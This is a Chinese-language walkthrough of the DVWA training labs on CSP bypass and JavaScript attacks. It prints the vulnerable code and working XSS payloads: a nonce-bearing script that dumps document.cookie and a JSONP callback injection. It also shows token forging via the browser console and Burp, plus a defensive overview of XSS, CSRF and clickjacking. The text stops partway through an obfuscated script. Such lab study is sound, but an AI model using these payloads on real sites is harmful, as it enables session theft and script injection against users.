![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754470278700-13d6707c-7a76-4ad3-90e0-fcdf9103260f.png)

### 难度medium
审计代码

```plain
<?php

$headerCSP = "Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';";

header($headerCSP);

// Disable XSS protections so that inline alert boxes will work
header ("X-XSS-Protection: 0");

# <script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>

?>
<?php
if (isset ($_POST['include'])) {
$page[ 'body' ] .= "
    " . $_POST['include'] . "
";
}
$page[ 'body' ] .= '
<form name="csp" method="POST">
    <p>Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.</p>
    <input size="50" type="text" name="include" value="" id="include" />
    <input type="submit" value="Include" />
</form>
';
```

在header中去掉了pastebin.com的校验，但是加了一个nonce属性且值必须为：TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=的校验，也就是在引入的script必须带入nonce=TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA= 信息才会被执行。

Html的nonce值信息，可参考于：[https://deepinout.com/html/html-questions/398_html_whats_the_purpose_of_the_html_nonce_attribute_for_script_and_style_elements.html](https://deepinout.com/html/html-questions/398_html_whats_the_purpose_of_the_html_nonce_attribute_for_script_and_style_elements.html)

nonce属性的作用

nonce是一个用于声明一次性的随机数的属性。它被用于script和style元素，以确保只有特定的内容可以被执行或应用。通过使用nonce属性，开发者可以提高网页的安全性，防止恶意脚本的注入和防范跨站脚本攻击（XSS）。

在引入外部script和style文件时，我们可以在对应的script和style标签上添加nonce属性来设置一次性的随机数。这样，只有带有正确nonce值的script和style文件才会被执行或应用。

由于通过nonce值进行校验，也就是提交的内容中，只要含nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA="的信息就可以。

如下，在script中加入nonce属性和指定的字串内容：

```plain
<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">document.write(document.cookie);</script>
```

成功获取cookie信息

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754554872494-fd7ce197-9aed-4956-aa3a-b7571578f4d9.png)

### 难度high
审计代码

服务器端代码如下：

```plain
<?php
$headerCSP = "Content-Security-Policy: script-src 'self';";

header($headerCSP);

?>
<?php
if (isset ($_POST['include'])) {
$page[ 'body' ] .= "
    " . $_POST['include'] . "
";
}
$page[ 'body' ] .= '
<form name="csp" method="POST">
    <p>The page makes a call to ' . DVWA_WEB_PAGE_TO_ROOT . '/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.</p>
    <p>1+2+3+4+5=<span id="answer"></span></p>
    <input type="button" id="solve" value="Solve the sum" />
</form>

<script src="source/high.js"></script>
';
```

high.js代码如下：

```plain
function clickButton() {
    var s = document.createElement("script");
    s.src = "source/jsonp.php?callback=solveSum";
    document.body.appendChild(s);
}

function solveSum(obj) {
    if ("answer" in obj) {
        document.getElementById("answer").innerHTML = obj['answer'];
    }
}

var solve_button = document.getElementById ("solve");

if (solve_button) {
    solve_button.addEventListener("click", function() {
        clickButton();
    });
}
```

源码如下，在点击网页的按钮使 js 生成一个 script 标签，src 指向 source/jsonp.php?callback=solveNum。document 对象使我们可以从脚本中对 HTML 页面中的所有元素进行访问，createElement() 方法通过指定名称创建一个元素，body 属性提供对 < body > 元素的直接访问，对于定义了框架集的文档将引用最外层的 < frameset >。appendChild() 方法可向节点的子节点列表的末尾添加新的子节点，也就是网页会把 “source/jsonp.php?callback=solveNum” 加入到 DOM 中。

源码中定义了 solveNum 的函数，函数传入参数 obj，如果字符串 “answer” 在 obj 中就会执行。getElementById() 方法可返回对拥有指定 ID 的第一个对象的引用，innerHTML 属性设置或返回表格行的开始和结束标签之间的 HTML。这里的 script 标签会把远程加载的 solveSum({"answer":"15"}) 当作 js 代码执行， 然后这个函数就会在页面显示答案。

注意到需要向 “source/jsonp.php” 传入 “callback” 参数，这个参数并没有进行任何过滤，因此可以通过这个参数进行注入，构造payload：

```plain
include=<script src="source/jsonp.php?callback=alert('xss');"></script>
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754555383174-86b1f001-b5f4-4e38-9bc2-fdc1ba97fd2e.png)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754555438322-20916b96-d0bc-41d3-bada-53acbcc569f6.png)

## 十四、前端攻击（JavaScript Attacks）
### 前言
JavaScript 攻击是一类通过利用 JavaScript 代码执行漏洞或滥用其特性来进行的网络攻击。这些攻击可以用来窃取敏感信息、劫持用户会话、执行恶意操作等。以下是几种常见的 JavaScript 攻击及其防御方法的详细介绍：

一、跨站脚本攻击 (Cross-Site Scripting, XSS)

1. 存储型 XSS（Stored XSS）

攻击者将恶意 JavaScript 代码存储在目标网站的数据库中。当其他用户访问包含这些恶意代码的页面时，代码会在用户的浏览器中执行，从而窃取用户信息或执行其他恶意操作。

2. 反射型 XSS（Reflected XSS）

恶意 JavaScript 代码通过 URL 参数传递给服务器，服务器在响应中包含这些代码并发送给用户。当用户点击恶意链接时，代码在用户的浏览器中执行。

3. 基于 DOM 的 XSS（DOM-based XSS）

恶意 JavaScript 代码直接修改网页的 DOM 结构，不通过服务器端处理。通常通过修改 URL 或其他客户端输入来实现。

防御措施：

输入验证和输出编码：对用户输入进行严格验证，并在输出到 HTML、JavaScript、CSS 或 URL 时进行正确的编码。

内容安全策略 (Content Security Policy, CSP)：使用 CSP 限制浏览器加载和执行的内容，防止执行未授权的脚本。

安全框架和库：使用安全的框架和库，自动处理编码和验证（如 Angular、React 等）。

二、跨站请求伪造 (Cross-Site Request Forgery, CSRF)

攻击者诱使受害者在已认证的情况下执行非预期的操作，例如提交表单、发送请求等，从而执行未经授权的操作。

防御措施：

CSRF 令牌：在每个表单或请求中包含唯一的 CSRF 令牌，并在服务器端进行验证。

同源策略 (SameSite) Cookie：设置 SameSite 属性的 Cookie，防止跨站点请求携带 Cookie。

双重提交 Cookie：在请求中包含 CSRF 令牌，同时通过 Cookie 发送，服务器验证两者是否一致。

三、点击劫持 (Clickjacking)

攻击者使用透明或隐藏的 iframe 覆盖目标网页，当用户点击网页时，实际上点击的是攻击者控制的内容，从而执行恶意操作。

防御措施：

X-Frame-Options 头：通过设置 HTTP 响应头 X-Frame-Options 为 DENY 或 SAMEORIGIN，防止网页被嵌入到 iframe 中。

Content Security Policy (CSP) 框架策略：使用 CSP 的 frame-ancestors 指令限制页面可以嵌入的父级域。

四、恶意脚本注入

攻击者通过输入恶意脚本，在不受信任的环境中执行，从而窃取数据、篡改页面或进行其他恶意操作。

防御措施：

输入验证：严格验证和清理所有用户输入，防止注入恶意脚本。

输出编码：在输出数据到 HTML、JavaScript、CSS 或 URL 时进行正确的编码，防止脚本执行。

使用安全的 API：尽量避免直接操作 DOM，使用安全的 API 处理用户输入。

五、JavaScript 依赖注入攻击

攻击者通过操控依赖库或供应链，将恶意代码注入到应用中，从而执行恶意操作。

防御措施：

依赖管理：使用可靠的依赖管理工具（如 npm、yarn），并定期更新和检查依赖库。

安全审计：对依赖库进行安全审计，确保没有已知的漏洞。

使用锁定文件：使用 package-lock.json 或 yarn.lock 文件锁定依赖版本，防止意外更新到有漏洞的版本。

六、跨站脚本包含 (Cross-Site Script Inclusion, XSSI)

攻击者通过引入恶意的 JavaScript 文件，窃取敏感信息或执行恶意操作。

防御措施：

验证来源：确保引入的所有 JavaScript 文件都来自受信任的来源。

使用 Subresource Integrity (SRI)：使用 SRI 哈希校验引入的资源，确保资源未被篡改。

内容安全策略 (CSP)：使用 CSP 限制加载的脚本源，防止加载未授权的脚本。

七、JSON 劫持

攻击者利用浏览器的 JSON 解析漏洞，窃取跨域 JSON 数据。

防御措施：

防止 JSONP：避免使用 JSONP 或严格控制 JSONP 的使用。

安全头部：在返回的 JSON 数据前添加安全头部，例如 )]}',\n，使其不被解析为合法的 JavaScript。

### 难度low
审计代码

```plain
<?php
$page['body'] .= <<<EOF
<script>

/*
MD5 code from here
https://github.com/blueimp/JavaScript-MD5
*/

!function(n){"use strict";function t(n,t){var r=(65535&n)+(65535&t);return(n>>16)+(t>>16)+(r>>16)<<16|65535&r}function r(n,t){return n<<t|n>>>32-t}function e(n,e,o,u,c,f){return t(r(t(t(e,n),t(u,f)),c),o)}function o(n,t,r,o,u,c,f){return e(t&r|~t&o,n,t,u,c,f)}function u(n,t,r,o,u,c,f){return e(t&o|r&~o,n,t,u,c,f)}function c(n,t,r,o,u,c,f){return e(t^r^o,n,t,u,c,f)}function f(n,t,r,o,u,c,f){return e(r^(t|~o),n,t,u,c,f)}function i(n,r){n[r>>5]|=128<<r%32,n[14+(r+64>>>9<<4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e<n.length;e+=16)i=l,a=g,d=v,h=m,g=f(g=f(g=f(g=f(g=c(g=c(g=c(g=c(g=u(g=u(g=u(g=u(g=o(g=o(g=o(g=o(g,v=o(v,m=o(m,l=o(l,g,v,m,n[e],7,-680876936),g,v,n[e+1],12,-389564586),l,g,n[e+2],17,606105819),m,l,n[e+3],22,-1044525330),v=o(v,m=o(m,l=o(l,g,v,m,n[e+4],7,-176418897),g,v,n[e+5],12,1200080426),l,g,n[e+6],17,-1473231341),m,l,n[e+7],22,-45705983),v=o(v,m=o(m,l=o(l,g,v,m,n[e+8],7,1770035416),g,v,n[e+9],12,-1958414417),l,g,n[e+10],17,-42063),m,l,n[e+11],22,-1990404162),v=o(v,m=o(m,l=o(l,g,v,m,n[e+12],7,1804603682),g,v,n[e+13],12,-40341101),l,g,n[e+14],17,-1502002290),m,l,n[e+15],22,1236535329),v=u(v,m=u(m,l=u(l,g,v,m,n[e+1],5,-165796510),g,v,n[e+6],9,-1069501632),l,g,n[e+11],14,643717713),m,l,n[e],20,-373897302),v=u(v,m=u(m,l=u(l,g,v,m,n[e+5],5,-701558691),g,v,n[e+10],9,38016083),l,g,n[e+15],14,-660478335),m,l,n[e+4],20,-405537848),v=u(v,m=u(m,l=u(l,g,v,m,n[e+9],5,568446438),g,v,n[e+14],9,-1019803690),l,g,n[e+3],14,-187363961),m,l,n[e+8],20,1163531501),v=u(v,m=u(m,l=u(l,g,v,m,n[e+13],5,-1444681467),g,v,n[e+2],9,-51403784),l,g,n[e+7],14,1735328473),m,l,n[e+12],20,-1926607734),v=c(v,m=c(m,l=c(l,g,v,m,n[e+5],4,-378558),g,v,n[e+8],11,-2022574463),l,g,n[e+11],16,1839030562),m,l,n[e+14],23,-35309556),v=c(v,m=c(m,l=c(l,g,v,m,n[e+1],4,-1530992060),g,v,n[e+4],11,1272893353),l,g,n[e+7],16,-155497632),m,l,n[e+10],23,-1094730640),v=c(v,m=c(m,l=c(l,g,v,m,n[e+13],4,681279174),g,v,n[e],11,-358537222),l,g,n[e+3],16,-722521979),m,l,n[e+6],23,76029189),v=c(v,m=c(m,l=c(l,g,v,m,n[e+9],4,-640364487),g,v,n[e+12],11,-421815835),l,g,n[e+15],16,530742520),m,l,n[e+2],23,-995338651),v=f(v,m=f(m,l=f(l,g,v,m,n[e],6,-198630844),g,v,n[e+7],10,1126891415),l,g,n[e+14],15,-1416354905),m,l,n[e+5],21,-57434055),v=f(v,m=f(m,l=f(l,g,v,m,n[e+12],6,1700485571),g,v,n[e+3],10,-1894986606),l,g,n[e+10],15,-1051523),m,l,n[e+1],21,-2054922799),v=f(v,m=f(m,l=f(l,g,v,m,n[e+8],6,1873313359),g,v,n[e+15],10,-30611744),l,g,n[e+6],15,-1560198380),m,l,n[e+13],21,1309151649),v=f(v,m=f(m,l=f(l,g,v,m,n[e+4],6,-145523070),g,v,n[e+11],10,-1120210379),l,g,n[e+2],15,718787259),m,l,n[e+9],21,-343485551),l=t(l,i),g=t(g,a),v=t(v,d),m=t(m,h);return[l,g,v,m]}function a(n){var t,r="",e=32*n.length;for(t=0;t<e;t+=8)r+=String.fromCharCode(n[t>>5]>>>t%32&255);return r}function d(n){var t,r=[];for(r[(n.length>>2)-1]=void 0,t=0;t<r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t<e;t+=8)r[t>>5]|=(255&n.charCodeAt(t/8))<<t%32;return r}function h(n){return a(i(d(n),8*n.length))}function l(n,t){var r,e,o=d(n),u=[],c=[];for(u[15]=c[15]=void 0,o.length>16&&(o=i(o,8*n.length)),r=0;r<16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(d(t)),512+8*t.length),a(i(c.concat(e),640))}function g(n){var t,r,e="";for(r=0;r<n.length;r+=1)t=n.charCodeAt(r),e+="0123456789abcdef".charAt(t>>>4&15)+"0123456789abcdef".charAt(15&t);return e}function v(n){return unescape(encodeURIComponent(n))}function m(n){return h(v(n))}function p(n){return g(m(n))}function s(n,t){return l(v(n),v(t))}function C(n,t){return g(s(n,t))}function A(n,t,r){return t?r?s(t,n):C(t,n):r?m(n):p(n)}"function"==typeof define&&define.amd?define(function(){return A}):"object"==typeof module&&module.exports?module.exports=A:n.md5=A}(this);

    function rot13(inp) {
        return inp.replace(/[a-zA-Z]/g,function(c){return String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);});
    }

    function generate_token() {
        var phrase = document.getElementById("phrase").value;
        document.getElementById("token").value = md5(rot13(phrase));
    }

    generate_token();
</script>
EOF;
?>
```

直接提交是不行的，burpsuite抓个包看到有个token参数，不管提交什么都是一样的，需要修改token值

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754556034759-d3f38cf0-c01c-456d-8ec1-9484b23c0a53.png)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754557095732-d2d9616e-41ec-4bf1-8009-72d00aa77189.png)

Web 控制台运行 generate_token() 函数

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754556499269-7de81dc1-9215-4c16-a2c8-1309d46d51b2.png)

然后再去页面提交success

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754556713411-cd4f35ea-1fcb-4ed8-8317-d6f155f9c5aa.png)

### 难度medium
审计代码

```plain
function do_something(e)
{
      for(var t = "", n = e.length - 1; n >=0; n--)
            t += e[n];
      return t
}

setTimeout(function()
{
      do_elsesomething("XX")
},300);

function do_elsesomething(e)
{
      document.getElementById("token").value = do_something(e + document.getElementById("phrase").value + "XX")
}
```

生成 token 的函数被放在单独的js文件中，生成的方式是将 "XX" + phrase 变量的值 + "XX"字符串反转作为 token。

默认值和success都抓包看下

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754557179233-4bf65417-15f3-4b31-9303-cdf441b85fdd.png)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754557209367-cbb3d584-2423-4fd6-9c71-0448455e0488.png)

token值都一样是XXeMegnahCXX

手动改一下

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754557311363-017a868d-e6d5-47fd-b16e-91a5520ce49f.png)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754557320507-a5ba1593-43d7-46e4-b716-7e672e722759.png)

成功了

或者是控制台运行下 do_elsesomething("XX") 函数，再次注入 “success” 即可

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754557597282-b8d3f08c-8724-4984-957b-b50a8329a3d7.png)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754557579020-df16df81-8c2f-4be2-b4e0-e2218921934b.png)

也是可以的

### 难度high
审计代码

```plain
var a = ['fromCharCode', 'toString', 'replace', 'BeJ', '\x5cw+', 'Lyg', 'SuR', '(w(){\x273M\x203L\x27;q\x201l=\x273K\x203I\x203J\x20T\x27;q\x201R=1c\x202I===\x271n\x27;q\x20Y=1R?2I:{};p(Y.3N){1R=1O}q\x202L=!1R&&1c\x202M===\x271n\x27;q\x202o=!Y.2S&&1c\x202d===\x271n\x27&&2d.2Q&&2d.2Q.3S;p(2o){Y=3R}z\x20p(2L){Y=2M}q\x202G=!Y.3Q&&1c\x202g===\x271n\x27&&2g.X;q\x202s=1c\x202l===\x27w\x27&&2l.3P;q\x201y=!Y.3H&&1c\x20Z!==\x272T\x27;q\x20m=\x273G\x27.3z(\x27\x27);q\x202w=[-3y,3x,3v,3w];q\x20U=[24,16,8,0];q\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\x201E=[\x271e\x27,\x2727\x27,\x271G\x27,\x272R\x27];q\x20l=[];p(Y.2S||!1z.1K){1z.1K=w(1x){A\x204C.Q.2U.1I(1x)===\x27[1n\x201z]\x27}}p(1y&&(Y.50||!Z.1N)){Z.1N=w(1x){A\x201c\x201x===\x271n\x27&&1x.1w&&1x.1w.1J===Z}}q\x202m=w(1X,x){A\x20w(s){A\x20O\x20N(x,1d).S(s)[1X]()}};q\x202a=w(x){q\x20P=2m(\x271e\x27,x);p(2o){P=2P(P,x)}P.1T=w(){A\x20O\x20N(x)};P.S=w(s){A\x20P.1T().S(s)};1g(q\x20i=0;i<1E.W;++i){q\x20T=1E[i];P[T]=2m(T,x)}A\x20P};q\x202P=w(P,x){q\x201S=2O(\x222N(\x271S\x27)\x22);q\x201Y=2O(\x222N(\x271w\x27).1Y\x22);q\x202n=x?\x271H\x27:\x271q\x27;q\x202z=w(s){p(1c\x20s===\x272p\x27){A\x201S.2x(2n).S(s,\x274S\x27).1G(\x271e\x27)}z{p(s===2q||s===2T){1u\x20O\x201t(1l)}z\x20p(s.1J===Z){s=O\x202r(s)}}p(1z.1K(s)||Z.1N(s)||s.1J===1Y){A\x201S.2x(2n).S(O\x201Y(s)).1G(\x271e\x27)}z{A\x20P(s)}};A\x202z};q\x202k=w(1X,x){A\x20w(G,s){A\x20O\x201P(G,x,1d).S(s)[1X]()}};q\x202f=w(x){q\x20P=2k(\x271e\x27,x);P.1T=w(G){A\x20O\x201P(G,x)};P.S=w(G,s){A\x20P.1T(G).S(s)};1g(q\x20i=0;i<1E.W;++i){q\x20T=1E[i];P[T]=2k(T,x)}A\x20P};w\x20N(x,1v){p(1v){l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l}z{k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}p(x){k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T}z{k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s}k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x}N.Q.S=w(s){p(k.1U){A}q\x202h,T=1c\x20s;p(T!==\x272p\x27){p(T===\x271n\x27){p(s===2q){1u\x20O\x201t(1l)}z\x20p(1y&&s.1J===Z){s=O\x202r(s)}z\x20p(!1z.1K(s)){p(!1y||!Z.1N(s)){1u\x20O\x201t(1l)}}}z{1u\x20O\x201t(1l)}2h=1d}q\x20r,M=0,i,W=s.W,l=k.l;4t(M<W){p(k.1L){k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}p(2h){1g(i=k.1A;M<W&&i<1k;++M){l[i>>2]|=s[M]<<U[i++&3]}}z{1g(i=k.1A;M<W&&i<1k;++M){r=s.1Q(M);p(r<R){l[i>>2]|=r<<U[i++&3]}z\x20p(r<2v){l[i>>2]|=(2t|(r>>6))<<U[i++&3];l[i>>2]|=(R|(r&V))<<U[i++&3]}z\x20p(r<2A||r>=2E){l[i>>2]|=(2D|(r>>12))<<U[i++&3];l[i>>2]|=(R|((r>>6)&V))<<U[i++&3];l[i>>2]|=(R|(r&V))<<U[i++&3]}z{r=2C+(((r&23)<<10)|(s.1Q(++M)&23));l[i>>2]|=(2X|(r>>18))<<U[i++&3];l[i>>2]|=(R|((r>>12)&V))<<U[i++&3];l[i>>2]|=(R|((r>>6)&V))<<U[i++&3];l[i>>2]|=(R|(r&V))<<U[i++&3]}}}k.2u=i;k.L+=i-k.1A;p(i>=1k){k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d}z{k.1A=i}}p(k.L>4r){k.2i+=k.L/2H<<0;k.L=k.L%2H}A\x20k};N.Q.1s=w(){p(k.1U){A}k.1U=1d;q\x20l=k.l,i=k.2u;l[16]=k.1C;l[i>>2]|=2w[i&3];k.1C=l[16];p(i>=4q){p(!k.1L){k.1W()}l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}l[14]=k.2i<<3|k.L>>>29;l[15]=k.L<<3;k.1W()};N.Q.1W=w(){q\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j<1k;++j){v=l[j-15];1a=((v>>>7)|(v<<25))^((v>>>18)|(v<<14))^(v>>>3);v=l[j-2];1b=((v>>>17)|(v<<15))^((v>>>19)|(v<<13))^(v>>>10);l[j]=l[j-16]+1a+l[j-7]+1b<<0}1D=b&c;1g(j=0;j<1k;j+=4){p(k.2j){p(k.x){1B=4m;v=l[0]-4n;h=v-4o<<0;d=v+4p<<0}z{1B=4v;v=l[0]-4w;h=v-4G<<0;d=v+4D<<0}k.2j=1O}z{1a=((a>>>2)|(a<<30))^((a>>>13)|(a<<19))^((a>>>22)|(a<<10));1b=((e>>>6)|(e<<26))^((e>>>11)|(e<<21))^((e>>>25)|(e<<7));1B=a&b;1j=1B^(a&c)^1D;1h=(e&f)^(~e&g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v<<0;d=v+1f<<0}1a=((d>>>2)|(d<<30))^((d>>>13)|(d<<19))^((d>>>22)|(d<<10));1b=((h>>>6)|(h<<26))^((h>>>11)|(h<<21))^((h>>>25)|(h<<7));1Z=d&a;1j=1Z^(d&b)^1B;1h=(h&e)^(~h&f);v=g+1b+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v<<0;c=v+1f<<0;1a=((c>>>2)|(c<<30))^((c>>>13)|(c<<19))^((c>>>22)|(c<<10));1b=((g>>>6)|(g<<26))^((g>>>11)|(g<<21))^((g>>>25)|(g<<7));1V=c&d;1j=1V^(c&a)^1Z;1h=(g&h)^(~g&e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1j;f=b+v<<0;b=v+1f<<0;1a=((b>>>2)|(b<<30))^((b>>>13)|(b<<19))^((b>>>22)|(b<<10));1b=((f>>>6)|(f<<26))^((f>>>11)|(f<<21))^((f>>>25)|(f<<7));1D=b&c;1j=1D^(b&d)^1V;1h=(f&g)^(~f&h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v<<0;a=v+1f<<0}k.C=k.C+a<<0;k.B=k.B+b<<0;k.E=k.E+c<<0;k.F=k.F+d<<0;k.J=k.J+e<<0;k.I=k.I+f<<0;k.H=k.H+g<<0;k.D=k.D+h<<0};N.Q.1e=w(){k.1s();q\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\x201e=m[(C>>28)&o]+m[(C>>24)&o]+m[(C>>20)&o]+m[(C>>16)&o]+m[(C>>12)&o]+m[(C>>8)&o]+m[(C>>4)&o]+m[C&o]+m[(B>>28)&o]+m[(B>>24)&o]+m[(B>>20)&o]+m[(B>>16)&o]+m[(B>>12)&o]+m[(B>>8)&o]+m[(B>>4)&o]+m[B&o]+m[(E>>28)&o]+m[(E>>24)&o]+m[(E>>20)&o]+m[(E>>16)&o]+m[(E>>12)&o]+m[(E>>8)&o]+m[(E>>4)&o]+m[E&o]+m[(F>>28)&o]+m[(F>>24)&o]+m[(F>>20)&o]+m[(F>>16)&o]+m[(F>>12)&o]+m[(F>>8)&o]+m[(F>>4)&o]+m[F&o]+m[(J>>28)&o]+m[(J>>24)&o]+m[(J>>20)&o]+m[(J>>16)&o]+m[(J>>12)&o]+m[(J>>8)&o]+m[(J>>4)&o]+m[J&o]+m[(I>>28)&o]+m[(I>>24)&o]+m[(I>>20)&o]+m[(I>>16)&o]+m[(I>>12)&o]+m[(I>>8)&o]+m[(I>>4)&o]+m[I&o]+m[(H>>28)&o]+m[(H>>24)&o]+m[(H>>20)&o]+m[(H>>16)&o]+m[(H>>12)&o]+m[(H>>8)&o]+m[(H>>4)&o]+m[H&o];p(!k.x){1e+=m[(D>>28)&o]+m[(D>>24)&o]+m[(D>>20)&o]+m[(D>>16)&o]+m[(D>>12)&o]+m[(D>>8)&o]+m[(D>>4)&o]+m[D&o]}A\x201e};N.Q.2U=N.Q.1e;N.Q.1G=w(){k.1s();q\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\x202b=[(C>>24)&u,(C>>16)&u,(C>>8)&u,C&u,(B>>24)&u,(B>>16)&u,(B>>8)&u,B&u,(E>>24)&u,(E>>16)&u,(E>>8)&u,E&u,(F>>24)&u,(F>>16)&u,(F>>8)&u,F&u,(J>>24)&u,(J>>16)&u,(J>>8)&u,J&u,(I>>24)&u,(I>>16)&u,(I>>8)&u,I&u,(H>>24)&u,(H>>16)&u,(H>>8)&u,H&u];p(!k.x){2b.4A((D>>24)&u,(D>>16)&u,(D>>8)&u,D&u)}A\x202b};N.Q.27=N.Q.1G;N.Q.2R=w(){k.1s();q\x201w=O\x20Z(k.x?28:32);q\x201i=O\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x){1i.1p(28,k.D)}A\x201w};w\x201P(G,x,1v){q\x20i,T=1c\x20G;p(T===\x272p\x27){q\x20L=[],W=G.W,M=0,r;1g(i=0;i<W;++i){r=G.1Q(i);p(r<R){L[M++]=r}z\x20p(r<2v){L[M++]=(2t|(r>>6));L[M++]=(R|(r&V))}z\x20p(r<2A||r>=2E){L[M++]=(2D|(r>>12));L[M++]=(R|((r>>6)&V));L[M++]=(R|(r&V))}z{r=2C+(((r&23)<<10)|(G.1Q(++i)&23));L[M++]=(2X|(r>>18));L[M++]=(R|((r>>12)&V));L[M++]=(R|((r>>6)&V));L[M++]=(R|(r&V))}}G=L}z{p(T===\x271n\x27){p(G===2q){1u\x20O\x201t(1l)}z\x20p(1y&&G.1J===Z){G=O\x202r(G)}z\x20p(!1z.1K(G)){p(!1y||!Z.1N(G)){1u\x20O\x201t(1l)}}}z{1u\x20O\x201t(1l)}}p(G.W>1k){G=(O\x20N(x,1d)).S(G).27()}q\x201F=[],2e=[];1g(i=0;i<1k;++i){q\x20b=G[i]||0;1F[i]=4z^b;2e[i]=4y^b}N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v}1P.Q=O\x20N();1P.Q.1s=w(){N.Q.1s.1I(k);p(k.2c){k.2c=1O;q\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)}};q\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G){2g.X=X}z{Y.1q=X.1q;Y.1H=X.1H;p(2s){2l(w(){A\x20X})}}})();w\x202y(e){1g(q\x20t=\x22\x22,n=e.W-1;n>=0;n--)t+=e[n];A\x20t}w\x202J(t,y=\x224B\x22){1m.1o(\x221M\x22).1r=1q(1m.1o(\x221M\x22).1r+y)}w\x202B(e=\x224E\x22){1m.1o(\x221M\x22).1r=1q(e+1m.1o(\x221M\x22).1r)}w\x202K(a,b){1m.1o(\x221M\x22).1r=2y(1m.1o(\x222F\x22).1r)}1m.1o(\x222F\x22).1r=\x22\x22;4u(w(){2B(\x224M\x22)},4N);1m.1o(\x224P\x22).4Q(\x224R\x22,2J);2K(\x223O\x22,44);', '||||||||||||||||||||this|blocks|HEX_CHARS||0x0F|if|var|code|message||0xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|0x80|update|type|SHIFT|0x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|64|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_BUFFER|Array|start|ab|block|bc|OUTPUT_TYPES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||0x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_JS|string|null|Uint8Array|AMD|0xc0|lastByteIndex|0x800|EXTRA|createHash|do_something|nodeMethod|0xd800|token_part_2|0x10000|0xe0|0xe000|phrase|COMMON_JS|4294967296|window|token_part_3|token_part_1|WEB_WORKER|self|require|eval|nodeWrap|versions|arrayBuffer|JS_SHA256_NO_NODE_JS|undefined|toString|hmac|innerHash|0xf0|0xa2bfe8a1|0xc24b8b70||0xa81a664b||0x92722c85|0x81c2c92e|0xc76c51a3|0x53380d13|0x766a0abb|0x4d2c6dfc|0x650a7354|0x748f82ee|0x84c87814|0x78a5636